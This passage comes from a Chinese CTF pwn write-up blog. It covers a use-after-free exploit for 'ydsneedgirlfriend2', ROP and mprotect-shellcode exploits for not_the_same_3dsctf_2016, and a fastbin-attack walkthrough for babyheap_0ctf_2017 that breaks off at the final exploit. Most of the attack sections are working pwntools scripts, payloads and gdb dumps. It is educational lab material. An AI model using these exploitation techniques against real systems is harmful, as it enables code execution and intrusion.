rel="noopener">https://www.anquanke.com/post/id/180009#h2-9</a></p><h2 id="0x50-ydsneedgirlfriend2"><a href="#0x50-ydsneedgirlfriend2" class="headerlink" title="0x50 ydsneedgirlfriend2"></a>0x50 ydsneedgirlfriend2</h2><p>题目来源：BJDCTF 2nd</p><p>考点：UAF</p><p>难度：简单</p><p>64位动态链接库程序</p><p>开启NX与canary保护</p><p>ida 反汇编分析</p><blockquote><p>add函数，添加一个女朋友，我要加10个，试了试只能加一个</p></blockquote><pre class=" language-lang-c"><code class="language-lang-c">unsigned __int64 add(){  void **v0; // rbx  int nbytes; // [rsp+8h] [rbp-28h]  char buf; // [rsp+10h] [rbp-20h]  unsigned __int64 v4; // [rsp+18h] [rbp-18h]  v4 = __readfsqword(0x28u);  if ( count > 7 )  {    puts("Full!");    exit(-1);  }  if ( !girlfriends[0] )  {    girlfriends[0] = malloc(0x10uLL);  //开始分配0x10的大小    if ( !girlfriends[0] )    {      perror("malloc failed=");      exit(-1);    }  }  girlfriends[0][1] = print_girlfriend_name;  puts("Please input the length of her name:");  read(0, &buf, 8uLL);  nbytes = atoi(&buf);                //长度  v0 = girlfriends[0];  *v0 = malloc(nbytes);  if ( !*girlfriends[0] )  {    perror("name malloc failed=");    exit(-1);  }  puts("Please tell me her name:");  read(0, *girlfriends[0], nbytes);  puts("what a beautiful name! Thank you on behalf of yds!");  ++count;  return __readfsqword(0x28u) ^ v4;}</code></pre><blockquote><p>dele函数，删除女朋友的信息</p><p>free两个堆块后没有将指针设置为NULL，所以可以Use After Free</p></blockquote><pre class=" language-lang-c"><code class="language-lang-c">unsigned __int64 dele(){  int v1; // [rsp+0h] [rbp-10h]  char buf; // [rsp+4h] [rbp-Ch]  unsigned __int64 v3; // [rsp+8h] [rbp-8h]  v3 = __readfsqword(0x28u);  printf("Index :");  read(0, &buf, 4uLL);  v1 = atoi(&buf);  if ( v1 >= 0 && v1 < count )  {    if ( girlfriends[v1] )    {      free(*girlfriends[v1]);      free(girlfriends[v1]);      puts("Why are u so cruel!");    }  }  else  {    puts("Out of bound!");  }  return __readfsqword(0x28u) ^ v3;}</code></pre><blockquote><p>show()函数</p></blockquote><pre class=" language-lang-c"><code class="language-lang-c">unsigned __int64 show(){  int v1; // [rsp+0h] [rbp-10h]  char buf; // [rsp+4h] [rbp-Ch]  unsigned __int64 v3; // [rsp+8h] [rbp-8h]  v3 = __readfsqword(0x28u);  printf("Index :");  read(0, &buf, 4uLL);  v1 = atoi(&buf);  if ( v1 >= 0 && v1 < count )  {    if ( girlfriends[v1] )      (girlfriends[v1][1])(girlfriends[v1], &buf);  }  else  {    puts("Out of bound!");  }  return __readfsqword(0x28u) ^ v3;}</code></pre><blockquote><p>后门，，，，</p></blockquote><pre class=" language-lang-c"><code class="language-lang-c">int backdoor(){  puts("YDS got N+ girlfriends!");  return system("/bin/sh");}</code></pre><blockquote><p>打印女朋友名字</p></blockquote><pre class=" language-lang-c"><code class="language-lang-c">int __fastcall print_girlfriend_name(const char **a1){  return puts(*a1);}</code></pre><p>看着看着就发现，这跟ctf-wiki里那道UAF简直一模一样</p><p>exp:</p><pre class=" language-lang-python"><code class="language-lang-python">#/usr/bin/env python#-*-coding:utf-8-*-from pwn import *proc=("./ydsneedgirlfriend2")backdoor=0x400D86def add(size,name):    io.recvuntil("u choice :\n")    io.sendline(str(1))    io.recvuntil("Please input the length of her name:\n")    io.sendline(str(size))    io.recvuntil("Please tell me her name:\n")    io.sendline(str(name))def dele(index):    io.recvuntil("u choice :\n")    io.sendline(str(2))    io.recvuntil("Index :")    io.sendline(str(index))def show(index):    io.recvuntil("u choice :\n")    io.sendline(str(3))    io.recvuntil("Index :")    io.sendline(str(index))def pwn(ip,port,debug):    global io    if debug==1:        context.log_level="debug"        io=process(proc)    else:        io=remote(ip,port)    add(0x100,'aaaa')    dele(0)    add(16,p64(backdoor)*2)    show(0)    # gdb.attach(io)    io.sendline("cat flag")    io.interactive()if __name__=="__main__":    pwn("node3.buuoj.cn",26814,1)</code></pre><h2 id="0x60-test"><a href="#0x60-test" class="headerlink" title="0x60 test"></a>0x60 test</h2><p>ssh连接上以后使用,发现过滤了很多字符，但我们发现，没有过滤od</p><p>因此：</p><pre class=" language-lang-txt"><code class="language-lang-txt">od *</code></pre><p>读取出：</p><pre class=" language-lang-txt"><code class="language-lang-txt">0000000 066146 063541 030573 033467 032142 034471 026465 0315410000020 032546 032055 032064 026467 060541 030470 063055 0330670000040 063060 032146 034063 030070 076471 077412</code></pre><p>通过：    printf(“0x%04x”,066146)</p><pre class=" language-lang-txt"><code class="language-lang-txt">0x6c660x67610x317b0x37370x34620x39390x2d350x33610x35660x342d0x34340x2d370x61610x31380x662d0x36370x66300x34660x38330x30380x7d390x7f0a</code></pre><p>最后16进制转一下ascii就行了</p><h2 id="0x70-rci"><a href="#0x70-rci" class="headerlink" title="0x70 rci"></a>0x70 rci</h2><p>这道题有bug，在输入第一个命令之后有几率出现getawd()失败的情况，这个时候就可以直接进入道第二个命令，之后在输入 <code>$0</code> 来获取shell</p><p>真正做法可以参考：<a href="https://www.jianshu.com/p/e13964824acf" target="_blank" rel="noopener">https://www.jianshu.com/p/e13964824acf</a></p><p>不过题目没有提供proc，需要 <code>ls -ali /tmp</code> 来查看</p><h2 id="0x80-snakes"><a href="#0x80-snakes" class="headerlink" title="0x80 snakes"></a>0x80 snakes</h2><p>修复二维码三个标识位得到密码： <code>sNaKes</code></p><p>登陆并且拿下文件后发现：</p><p>NAME 与 flag 刚好相差100个字节，因此，我们输入 <code>'a'*100</code> 拿到flag</p><h2 id="0x100-总结"><a href="#0x100-总结" class="headerlink" title="0x100 总结"></a>0x100 总结</h2><p>本次就写出来这几道题，剩下的几道复现一下后会写到另一篇里面</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Pwn练习-Day06</title>
      <link href="/2020/03/20/ctf/pwn/day06/"/>
      <url>/2020/03/20/ctf/pwn/day06/</url>
      
        <content type="html"><![CDATA[<h1 id="Day06"><a href="#Day06" class="headerlink" title="Day06"></a>Day06</h1><p>堆溢出，确实不太好搞，得尽快刷了，两天才弄懂（其实并不是很懂）</p><p><img src="https://cdn.jsdelivr.net/gh/180CM55KG/cdn/img/20200315151450.png" alt=""></p><h2 id="not-the-same-3dsctf-2016"><a href="#not-the-same-3dsctf-2016" class="headerlink" title="not_the_same_3dsctf_2016"></a>not_the_same_3dsctf_2016</h2><p>题目来源：buuoj.cn</p><p>考点：orw,<strong>mprotect</strong>,ret2shellcode</p><p>难度：简单</p><p>file:</p><pre class=" language-lang-txt"><code class="language-lang-txt">not_the_same_3dsctf_2016: ELF 32-bit LSB executable, Intel 80386, version 1 (GNU/Linux), statically linked, for GNU/Linux 2.6.32, not stripped</code></pre><p>32位静态链接库文件</p><p>checksec</p><pre class=" language-lang-txt"><code class="language-lang-txt">    Arch:     i386-32-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x8048000)</code></pre><p>开启NX保护</p><p>ida 反汇编主要函数</p><pre class=" language-lang-c"><code class="language-lang-c">int __cdecl main(int argc, const char **argv, const char **envp){  char v4; // [esp+Fh] [ebp-2Dh]  printf("b0r4 v3r s3 7u 4h o b1ch4o m3m0... ");  gets(&v4);  return 0;}</code></pre><pre class=" language-lang-c"><code class="language-lang-c">int get_secret(){  int v0; // esi  v0 = fopen("flag.txt", &unk_80CF91B);  fgets(&fl4g, 45, v0);  return fclose(v0);}</code></pre><p>get_secret()函数提供了一个将flag.txt中的内容读取到&amp;fl4g这个地址中的功能，而没有提供打印出来的功能</p><p>因此对于这道题，我们的方法也多了起来</p><p>1.就是利用我们前面介绍过的orw</p><pre class=" language-lang-python"><code class="language-lang-python">#/usr/bin/env python#-*-coding:utf-8-*-from pwn import *context.log_level="debug"elf=ELF("./not_the_same_3dsctf_2016")#sh=process("./not_the_same_3dsctf_2016") sh=remote("node3.buuoj.cn",28519)op=elf.symbols['open']mprotect_addr = elf.symbols['mprotect']read = elf.symbols['read']write = elf.symbols['write']bss=0x080EB000flag=0x080BC2A8# 0x0809e3e5 : pop ebp ; pop esi ; pop edi ; ret# 0x0806fcf1 : pop ecx ; pop ebx ; retpop3_ret = 0x0809e3e5pop2_ret=0x0806fcf1pl='a'*0x2d+p32(op)+p32(pop2_ret)+p32(flag)+p32(0)pl+=p32(read)+p32(pop3_ret)+p32(3)+p32(bss)+p32(64)pl+=p32(write)+'dead'+p32(1)+p32(bss)+p32(64)sh.sendline(pl)sh.interactive()</code></pre><p>但上次没解释清楚pop3_ret和pop2_ret的含义,以及为什么要使用这两个gadget</p><p>我们先来看看open函数的原型：</p><pre class=" language-lang-txt"><code class="language-lang-txt">open函数的三个参数：（1）path是已经存在的文件的路径；（2）oflags参数：若值为 O_RDONLY ，就以只读方式打开文件；               若值为 O_WDONLY，就以只写方式打开文件；               若值为 O_RDWR，就以读写方式打开文件；（3）参数mode:文件的权限，对于一个已经存在的文件，参数mode是没有用的，通常将其省略，因此这种情况下open调用只需两个参数</code></pre><p>write函数原型：</p><pre class=" language-lang-txt"><code class="language-lang-txt">write函数的三个参数：（1）fildes: 文件描述符（2）buf：指定写入数据的数据缓冲区（3）nbytes：指定写入的字节数</code></pre><pre class=" language-lang-txt"><code class="language-lang-txt">为啥要找3个pop,也就是在正常情况下,函数传参是使用push，所以要为了堆栈还原,函数调用结束时就使用pop来保证堆栈完好.</code></pre><p>2.<strong>mprotect</strong></p><p>第二种于前天介绍的一样，作为学pwn的只读个flag肯定是满足不了我们的啊</p><p>通过修改数据段权限，我们可以达到执行shellcode的目的</p><p>exp:</p><pre class=" language-lang-python"><code class="language-lang-python">#/usr/bin/env python#-*-coding:utf-8-*-from pwn import *p=process('./not_the_same_3dsctf_2016')elf=ELF('./not_the_same_3dsctf_2016')payload='a'*0x2d+p32(elf.symbols['mprotect'])payload+=p32(0x0809e3e5)payload+=p32(0x080EB000)payload+=p32(0x1000)+p32(0x7)payload+=p32(elf.symbols['read'])payload+=p32(0x0809e3e5)+p32(0)+p32(0x080EBF80)+p32(0x100)+p32(0x080EBF80)p.sendline(payload)payload=asm(shellcraft.sh())p.sendline(payload)p.interactive()</code></pre><p>思路：</p><pre class=" language-lang-txt"><code class="language-lang-txt">如何进行内存的权限修改,思路:1.栈溢出ret 到 mprotect函数地址,我来解释一下 call 指令, call = push + jmp所以直接ret后要留一个返回地址,因为ret 就相当于 jmp 到 mprotect,为了完整的回来,所以在mprotect地址后在压入一个返回地址.2.在32为系统中传参是使用栈传参,择第一个参数先push,第二个再push....所以基本的payload可以构思如下:payload = 'A' + 0x38 + p32(mprotect_addr)payaloda += p32(ret_addr) + p32(argu1) + p32(argu2) +p32 (argu3)这里的mprotect_addr就是我们要跳转到mprotect函数的地址ret_addr 为 mprotect函数执行完后的地址.argu1 为mprotect函数的第一个参数 (被修改内存的地址) 设置为 0x0x80EB000 (edb-debuger查看得到)argu2 为mprotect函数的第二个参数 (被修改内存的大小) 设置为 0x1000 (0x1000通过程序启动时查看该内存块的大小的到的)argu3 为mprotect函数的第三个参数 (被修改内存的权限) 设置为 7 = 4 + 2 +1 (rwx)为了后续再能使用栈ret,我们的构造一下栈的布局,因为mprotect函数使用到了3个参数,我们就找存在3个连续pop的指令为啥要找3个pop,也就是在正常情况下,函数传参是使用push，所以要为了堆栈还原,函数调用结束时就使用pop来保证堆栈完好.使用 ROPgadget --binary get_started_3dsctf_2016 --only 'pop|ret' | grep pop存在pop的一些指令地址,可以发现:0x0804f460 : pop ebx ; pop esi ; pop ebp ; ret那我们就得到了该地址.上面的ret_addr就填写0x0804f460好下面我们就要构思如何将自己的shellcode写入内存再执行,使用read函数写入.read函数原型:ssize_t read(int fd, void *buf, size_t count);fd 设为0时就可以从输入端读取内容buf 设为我们想要执行的内存地址size 适当大小就可以</code></pre><p>这题其实还有其他解法，但思路都是相似的，例如使用fputs函数来读取flag,等</p><h2 id="babyheap-0ctf-2017"><a href="#babyheap-0ctf-2017" class="headerlink" title="babyheap_0ctf_2017"></a>babyheap_0ctf_2017</h2><p>题目来源：buuoj</p><p>考点：堆溢出, <strong>fastbin attack</strong></p><p>难度：baby</p><p>你说它是个BABY那他就是吧</p><h3 id="0x00-题目分析"><a href="#0x00-题目分析" class="headerlink" title="0x00 题目分析"></a>0x00 题目分析</h3><p>file:</p><pre class=" language-lang-txt"><code class="language-lang-txt">babyheap_0ctf_2017: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 2.6.32, BuildID[sha1]=9e5bfa980355d6158a76acacb7bda01f4e3fc1c2, stripped</code></pre><p>64位动态链接库文件</p><p>checksec:</p><pre class=" language-lang-txt"><code class="language-lang-txt">    Arch:     amd64-64-little    RELRO:    Full RELRO    Stack:    Canary found    NX:       NX enabled    PIE:      PIE enabled</code></pre><p>堆溢出都是这样的保护全开</p><pre class=" language-lang-txt"><code class="language-lang-txt">===== Baby Heap in 2017 =====1. Allocate2. Fill3. Free4. Dump5. Exit</code></pre><p>程序提供了5个功能</p><ul><li>Allocate - 调用 calloc 分配小于 0x1000 大小的内存，calloc 分配的 chunk 会被清空。</li><li>Fill - 填充任意大小的内存，意味着可以覆盖其它 chunk。</li><li>Free - 释放一块 chunk。</li><li>Dump - 输出限制大小的 chunk 内容。</li></ul><p>ida 反汇编</p><p><strong>1. Allocate</strong></p><blockquote><p>分配内存</p></blockquote><pre class=" language-lang-c"><code class="language-lang-c">void __fastcall sub_D48(__int64 a1){  signed int i; // [rsp+10h] [rbp-10h]  signed int v2; // [rsp+14h] [rbp-Ch]  void *v3; // [rsp+18h] [rbp-8h]  for ( i = 0; i <= 15; ++i )  {    if ( !*(24LL * i + a1) )    {      printf("Size: ");      v2 = sub_138C();      if ( v2 > 0 )      {        if ( v2 > 4096 )          v2 = 4096;        v3 = calloc(v2, 1uLL);        if ( !v3 )          exit(-1);        *(24LL * i + a1) = 1;        *(a1 + 24LL * i + 8) = v2;        *(a1 + 24LL * i + 16) = v3;        printf("Allocate Index %d\n", i);      }      return;    }  }}</code></pre><p><strong>2. Fill</strong></p><blockquote><p>填充内容，可填充任意字长的内容，漏洞就出在此处。</p></blockquote><pre class=" language-lang-c"><code class="language-lang-c">__int64 __fastcall sub_E7F(__int64 a1){  __int64 result; // rax  int v2; // [rsp+18h] [rbp-8h]  int v3; // [rsp+1Ch] [rbp-4h]  printf("Index: ");  result = sub_138C();  v2 = result;  if ( result >= 0 && result <= 15 )  {    result = *(24LL * result + a1);    if ( result == 1 )    {      printf("Size: ");      result = sub_138C();      v3 = result;            //这里对输入长度没有限制      if ( result > 0 )      {        printf("Content: ");        result = sub_11B2(*(24LL * v2 + a1 + 16), v3);      }    }  }  return result;}</code></pre><p><strong>3. Free</strong></p><blockquote><p>释放内存</p></blockquote><pre class=" language-lang-c"><code class="language-lang-c">__int64 __fastcall sub_F50(__int64 a1){  __int64 result; // rax  int v2; // [rsp+1Ch] [rbp-4h]  printf("Index: ");  result = sub_138C();  v2 = result;  if ( result >= 0 && result <= 15 )  {    result = *(24LL * result + a1);    if ( result == 1 )    {      *(24LL * v2 + a1) = 0;      *(24LL * v2 + a1 + 8) = 0LL;      free(*(24LL * v2 + a1 + 16));      result = 24LL * v2 + a1;      *(result + 16) = 0LL;    }  }  return result;}</code></pre><p><strong>4. Dump</strong></p><blockquote><p>打印内容</p></blockquote><pre class=" language-lang-c"><code class="language-lang-c">signed int __fastcall sub_1051(__int64 a1){  signed int result; // eax  signed int v2; // [rsp+1Ch] [rbp-4h]  printf("Index: ");  result = sub_138C();  v2 = result;  if ( result >= 0 && result <= 15 )  {    result = *(24LL * result + a1);    if ( result == 1 )    {      puts("Content: ");      sub_130F(*(24LL * v2 + a1 + 16), *(24LL * v2 + a1 + 8));      result = puts(byte_14F1);    }  }  return result;}</code></pre><p>利用思路：</p><p>在fill的地方存在一个堆溢出，可以写任意长度，因为分配使用的calloc，所以在分配的时候会将分配出来的chunk先清空，dump的大小是根据alloc指定的size决定的，跟真正的chunk大小无关。</p><h3 id="0x10-Leak-Libc"><a href="#0x10-Leak-Libc" class="headerlink" title="0x10 Leak Libc"></a>0x10 Leak Libc</h3><p>程序没有 uaf ，内存被释放后无法查看其中内容，可以通过 double free 获得指向 small bin 的 index，将其释放后 dump 出来。</p><p>首先分配一系列相同大小的 fast chunk，再分配一个 small chunk，释放掉其中一个 fast chunk。</p><pre class=" language-lang-txt"><code class="language-lang-txt">    Allocate(0x10)    Allocate(0x10)    Allocate(0x10)    Allocate(0x10)    free(1)</code></pre><pre class=" language-lang-txt"><code class="language-lang-txt">gdb-peda$ x/48wx 0x55a1cc17d0000x55a1cc17d000:    0x00000000    0x00000000    0x00000021    0x00000000  ==>chunk0(fastbin,in use)0x55a1cc17d010:    0x00000000    0x00000000    0x00000000    0x000000000x55a1cc17d020:    0x00000000    0x00000000    0x00000021    0x00000000  ==>chunk1(fastbin ,free)0x55a1cc17d030:    0x00000000    0x00000000    0x00000000    0x000000000x55a1cc17d040:    0x00000000    0x00000000    0x00000021    0x00000000  ==>chunk2(fastbin ,in use)0x55a1cc17d050:    0x00000000    0x00000000    0x00000000    0x000000000x55a1cc17d060:    0x00000000    0x00000000    0x00000021    0x00000000  ==>chunk3(fastbin ,in use)0x55a1cc17d070:    0x00000000    0x00000000    0x00000000    0x000000000x55a1cc17d080:    0x00000000    0x00000000    0x00000091    0x00000000  ==>chunk4(smallbins ,in use)0x55a1cc17d090:    0x00000000    0x00000000    0x00000000    0x000000000x55a1cc17d0a0:    0x00000000    0x00000000    0x00000000    0x000000000x55a1cc17d0b0:    0x00000000    0x00000000    0x00000000    0x00000000gdb-peda$ x/32xw &main_arena0x7f001f560b20 <main_arena>:    0x00000000    0x00000000    0xcc17d020    0x000055a1 ==>fastbin[0]0x7f001f560b30 <main_arena+16>:    0x00000000    0x00000000    0x00000000    0x000000000x7f001f560b40 <main_arena+32>:    0x00000000    0x00000000    0x00000000    0x000000000x7f001f560b50 <main_arena+48>:    0x00000000    0x00000000    0x00000000    0x000000000x7f001f560b60 <main_arena+64>:    0x00000000    0x00000000    0x00000000    0x000000000x7f001f560b70 <main_arena+80>:    0x00000000    0x00000000    0xcc17d110    0x000055a10x7f001f560b80 <main_arena+96>:    0x00000000    0x00000000    0x1f560b78    0x00007f000x7f001f560b90 <main_arena+112>:    0x1f560b78    0x00007f00    0x1f560b88    0x00007f00</code></pre><p>释放的那个 fast chunk 被放入到 fastbin 中，fastbin 为单链表形式，如果再释放一个 fast chunk，将其插入 fastbin 的头部，释放的第二个 chunk 其 fd 会被设置成第一个 chunk 的地址。</p><pre class=" language-lang-txt"><code class="language-lang-txt">    Allocate(0x10)    Allocate(0x10)    Allocate(0x10)    Allocate(0x10)    Allocate(0x80)    free(1)    free(2)</code></pre><pre class=" language-lang-txt"><code class="language-lang-txt">gdb-peda$ x/48wx 0x56365c80a0000x56365c80a000:    0x00000000    0x00000000    0x00000021    0x00000000  ==>chunk0(fastbin,in use)0x56365c80a010:    0x00000000    0x00000000    0x00000000    0x000000000x56365c80a020:    0x00000000    0x00000000    0x00000021    0x00000000  ==>chunk1(fastbin,free)0x56365c80a030:    0x00000000    0x00000000    0x00000000    0x000000000x56365c80a040:    0x00000000    0x00000000    0x00000021    0x00000000  ==>chunk2(fastbin,free)0x56365c80a050:    0x5c80a020    0x00005636    0x00000000    0x000000000x56365c80a060:    0x00000000    0x00000000    0x00000021    0x00000000  ==>chunk3(fastbin,in use)0x56365c80a070:    0x00000000    0x00000000    0x00000000    0x000000000x56365c80a080:    0x00000000    0x00000000    0x00000091    0x00000000  ==>chunk4(fastbin,in use)0x56365c80a090:    0x00000000    0x00000000    0x00000000    0x000000000x56365c80a0a0:    0x00000000    0x00000000    0x00000000    0x000000000x56365c80a0b0:    0x00000000    0x00000000    0x00000000    0x00000000gdb-peda$ x/32xw &main_arena0x7fe892d7eb20 <main_arena>:    0x00000000    0x00000000    0x5c80a040    0x00005636 ==>最新释放的 chunk0x7fe892d7eb30 <main_arena+16>:    0x00000000    0x00000000    0x00000000    0x000000000x7fe892d7eb40 <main_arena+32>:    0x00000000    0x00000000    0x00000000    0x000000000x7fe892d7eb50 <main_arena+48>:    0x00000000    0x00000000    0x00000000    0x000000000x7fe892d7eb60 <main_arena+64>:    0x00000000    0x00000000    0x00000000    0x000000000x7fe892d7eb70 <main_arena+80>:    0x00000000    0x00000000    0x5c80a110    0x000056360x7fe892d7eb80 <main_arena+96>:    0x00000000    0x00000000    0x92d7eb78    0x00007fe80x7fe892d7eb90 <main_arena+112>:    0x92d7eb78    0x00007fe8    0x92d7eb88    0x00007fe8</code></pre><p>此时使用 fill 覆盖 fastbin 头部 chunk 的 fd 值，将其改写成 small chunk 的地址，那么通过两次 alloc，先将 small chunk 放入 fastbin，再将其取出来，获得指向它的 index。要这么做必须绕过 malloc 的安全检查：</p><pre class=" language-lang-c"><code class="language-lang-c">if (__builtin_expect (fastbin_index (chunksize (victim)) != idx, 0)){    errstr = "malloc(): memory corruption (fast)";errout:    malloc_printerr (check_action, errstr, chunk2mem (victim), av);    return NULL;}</code></pre><p>查看其 chunksize 与相应的 fastbin_index 是否匹配，实际上 chunksize 的计算方法是 <code>victim-&gt;size &amp; ~(SIZE_BITS))</code>，而它对应的 index 计算方法为 <code>(size) &gt;&gt; (SIZE_SZ == 8 ? 4 : 3) - 2</code>，这里 64位的平台对应的 SIZE_SZ 是8，则 fastbin_index 为 <code>(size &gt;&gt; 4) - 2</code>，那么我们将 small chunk 的 size 域改写成 0x21 即可。</p><pre class=" language-lang-txt"><code class="language-lang-txt">    Allocate(0x10)    Allocate(0x10)    Allocate(0x10)    Allocate(0x10)    Allocate(0x80)    free(1)    free(2)    payload = p64(0)*3    payload += p64(0x21)    payload += p64(0)*3    payload += p64(0x21)    payload += p8(0x80)    fill(0, payload)    payload = p64(0)*3    payload += p64(0x21)    fill(3, payload)    Allocate(0x10)    Allocate(0x10)0x441a4924a940:    0x0000000000000001    0x00000000000000100x441a4924a950:    0x000056254a9bc010    0x00000000000000010x441a4924a960:    0x0000000000000010    0x000056254a9bc0500x441a4924a970:    0x0000000000000001    0x00000000000000100x441a4924a980:    0x000056254a9bc090    0x00000000000000010x441a4924a990:    0x0000000000000010    0x000056254a9bc0700x441a4924a9a0:    0x0000000000000001    0x00000000000000800x441a4924a9b0:    0x000056254a9bc090    0x00000000000000000x441a4924a9c0:    0x0000000000000000    0x00000000000000000x441a4924a9d0:    0x0000000000000000    0x0000000000000000</code></pre><p>可以看到 index[2] 存放的是 small chunk 的地址，此时将 small chunk 的 size 改写回来，将其释放掉就可以 dump 出来了。</p><pre class=" language-lang-txt"><code class="language-lang-txt">    Allocate(0x10)    Allocate(0x10)    Allocate(0x10)    Allocate(0x10)    Allocate(0x80)    free(1)    free(2)    payload = p64(0)*3    payload += p64(0x21)    payload += p64(0)*3    payload += p64(0x21)    payload += p8(0x80)    fill(0, payload)    payload = p64(0)*3    payload += p64(0x21)    fill(3, payload)    Allocate(0x10)    Allocate(0x10)    payload = p64(0)*3    payload += p64(0x91)    fill(3, payload)    Allocate(0x80)    free(4)    libc_base = u64(dump(2)[:8].strip().ljust(8, "\x00"))-0x3c4b78    log.info("libc_base: "+hex(libc_base))</code></pre><p>可以发现 index 为 2 的 chunk 的 fd 指针指向 index 为 1 的 chunk 。</p><pre class=" language-lang-txt"><code class="language-lang-txt">payload = p64(0) * 3payload += p64(0x21)payload += p64(0) * 3payload += p64(0x21)payload += p8(0x80)fill(0,payload)</code></pre><p>  把 chunk 2 的内容覆盖为 chunk 4 的地址，这样相当于 chunk 4 已经被 free 了而且被存放在 fastbin 中。</p><pre class=" language-lang-txt"><code class="language-lang-txt">payload = p64(0) * 3payload += p64(0x21)fill(3,payload)</code></pre><p>  此时 heap 如下</p><pre class=" language-lang-txt"><code class="language-lang-txt">gdb-peda$ x /40xg 0x55a64a9e8000 30x55a64a9e8000: 0x0000000000000000  0x0000000000000021  chunk 0 0x55a64a9e8010: 0x0000000000000000  0x00000000000000000x55a64a9e8020: 0x0000000000000000  0x0000000000000021  chunk 10x55a64a9e8030: 0x0000000000000000  0x00000000000000000x55a64a9e8040: 0x0000000000000000  0x0000000000000021  chunk 20x55a64a9e8050: 0x000055a64a9e8080  0x00000000000000000x55a64a9e8060: 0x0000000000000000  0x0000000000000021  chunk 30x55a64a9e8070: 0x0000000000000000  0x00000000000000000x55a64a9e8080: 0x0000000000000000  0x0000000000000021  chunk 40x55a64a9e8090: 0x0000000000000000  0x00000000000000000x55a64a9e80a0: 0x0000000000000000  0x00000000000000000x55a64a9e80b0: 0x0000000000000000  0x00000000000000000x55a64a9e80c0: 0x0000000000000000  0x00000000000000000x55a64a9e80d0: 0x0000000000000000  0x00000000000000000x55a64a9e80e0: 0x0000000000000000  0x00000000000000000x55a64a9e80f0: 0x0000000000000000  0x00000000000000000x55a64a9e8100: 0x0000000000000000  0x00000000000000000x55a64a9e8110: 0x0000000000000000  0x0000000000020ef10x55a64a9e8120: 0x0000000000000000  0x00000000000000000x55a64a9e8130: 0x0000000000000000  0x0000000000000000</code></pre><p>  我们等下要 malloc 回 chunk 4 ，可是 malloc fastbin 有检查， chunksize 必须与相应的 fastbin_index 匹配，所以我们覆盖 chunk 4 的 size 为 fastbin 大小</p><pre class=" language-lang-txt"><code class="language-lang-txt">allocate(0x10)allocate(0x10)payload = p64(0) * 3payload += p64(0x91)fill(3,payload)allocate(0x80)free(4)libc_base = u64(dump(2)[:8].strip().ljust(8, "\x00"))-0x3c4b78log.info("libc_base: "+hex(libc_base))</code></pre><p>  unsortbin 有一个特性，就是如果 usortbin 只有一个 bin ，它的 fd 和 bk 指针会指向同一个地址(unsorted bin 链表的头部），这个地址为 main_arena + 0x58 ，而且 main_arena 又相对 libc 固定偏移 0x3c4b20 ，所以得到这个fd的值，然后减去0x58再减去main_arena相对于libc的固定偏移，即得到libc的基地址。所以我们需要把 chunk 改成大于 fastbin 的大小，这样 free 后能进入 unsortbin 让我们能够泄露 libc 基址。<br>  我们的目标是覆盖 __malloc_hook 函数，这样我们调用 malloc 时就相当于调用我们写入的内容</p><pre class=" language-lang-txt"><code class="language-lang-txt">gdb-peda$ x/32xw (long long)(&main_arena)-0x400x7f2a8a09eae0 <_IO_wide_data_0+288>:   0x00000000  0x00000000  0x00000000  0x000000000x7f2a8a09eaf0 <_IO_wide_data_0+304>:   0x8a09d260  0x00007f2a  0x00000000  0x000000000x7f2a8a09eb00 <__memalign_hook>:   0x89d5fe20  0x00007f2a  0x89d5fa00  0x00007f2a0x7f2a8a09eb10 <__malloc_hook>: 0x00000000  0x00000000  0x00000000  0x000000000x7f2a8a09eb20 <main_arena>:    0x00000000  0x00000000  0x00000000  0x000000000x7f2a8a09eb30 <main_arena+16>: 0x00000000  0x00000000  0x00000000  0x000000000x7f2a8a09eb40 <main_arena+32>: 0x00000000  0x00000000  0x00000000  0x000000000x7f2a8a09eb50 <main_arena+48>: 0x00000000  0x00000000  0x00000000  0x00000000</code></pre><p>   malloc 时还需要再次绕过检测，我 malloc(0x60) 也就是 0x70 大小的 chunk</p><pre class=" language-lang-txt"><code class="language-lang-txt">gdb-peda$ x/32xw (long long)(&main_arena)-0x40+0xd0x7f2a8a09eaed <_IO_wide_data_0+301>:   0x60000000  0x2a8a09d2  0x0000007f  0x000000000x7f2a8a09eafd: 0x20000000  0x2a89d5fe  0x0000007f  0x2a89d5fa0x7f2a8a09eb0d <__realloc_hook+5>:  0x0000007f  0x00000000  0x00000000  0x000000000x7f2a8a09eb1d: 0x00000000  0x00000000  0x00000000  0x000000000x7f2a8a09eb2d <main_arena+13>: 0x00000000  0x00000000  0x00000000  0x000000000x7f2a8a09eb3d <main_arena+29>: 0x00000000  0x00000000  0x00000000  0x000000000x7f2a8a09eb4d <main_arena+45>: 0x00000000  0x00000000  0x00000000  0x000000000x7f2a8a09eb5d <main_arena+61>: 0x00000000  0x00000000  0x00000000  0x00000000</code></pre><p>  可以发现在 0x7f2a8a09eaed 处构造块可以绕过检测（因为 7f 满足 0x70 大小），可以计算 0x7f2a8a09eaed 距离 libc 基址的偏移为 0x3c4aed</p><pre class=" language-lang-txt"><code class="language-lang-txt">allocate(0x60)free(4)payload = p64(libc_base+0x3c4aed)fill(2, payload)</code></pre><p>  首先把 chunk 4 malloc 回来，这次 malloc 的大小在 fastbin 之内，然后把 chunk 4 的内容改为我们下一个要构造块的地址（chunk 4 已经被 free 掉，所以无法用 fill(4) 写入，由于我们刚刚把 chunk 2 的 fd 指针改为 chunk 4 的地址，所以第一次 malloc(0x10) 的时候是分配的原来 chunk 2 的块给 index 1，第二次 malloc(0x10) 的时候就会分配 chunk 4 的块给 index 2，也就是说 index 2 与 index 4 的内容都是 chunk 4）</p><pre class=" language-lang-txt"><code class="language-lang-txt">allocate(0x60)allocate(0x60)payload = p8(0)*3payload += p64(0)*2payload += p64(libc_base+0x4526a)fill(6, payload)allocate(200)</code></pre><p>完整exp:</p><pre class=" language-lang-python"><code class="language-lang-python">#/usr/bin/env python#-*-coding:utf-8-*-from pwn import *import syscontext.log_level = "debug"proc="./babyheap_0ctf_2017"def 